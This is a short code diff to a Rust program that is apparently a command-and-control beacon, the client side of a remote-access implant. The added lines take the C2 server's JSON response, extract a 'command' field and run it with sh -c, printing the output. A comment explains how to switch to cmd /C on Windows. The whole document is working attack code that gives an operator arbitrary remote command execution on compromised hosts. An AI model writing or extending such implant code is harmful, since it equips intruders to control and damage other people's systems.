@@ -38,8 +38,20 @@ fn send_beacon(client: &Client, c2_url: &str, payload: &BeaconPayload) {
         Ok(resp) => {
             if let Ok(text) = resp.text() {
                 println!("[*] C2 Response: {}", text);
-            } else {
-                println!("[!] No response from C2");
+                if let Ok(json) = serde_json::from_str::<serde_json::Value>(&text) {
+                    if let Some(cmd) = json.get("command").and_then(|v| v.as_str()) {
+                        if !cmd.is_empty() {
+                            println!("[*] Executing command: {}", cmd);
+                            //For Windows, replace "sh" "-c" with "cmd" "/C".
+                            let output = Command::new("sh")
+                                .arg("-c")
+                                .arg(cmd)
+                                .output()
+                                .expect("Command failed");
+                            println!("{}", String::from_utf8_lossy(&output.stdout));
+                        }
+                    }
+                }
             }
         }
         Err(e) => {
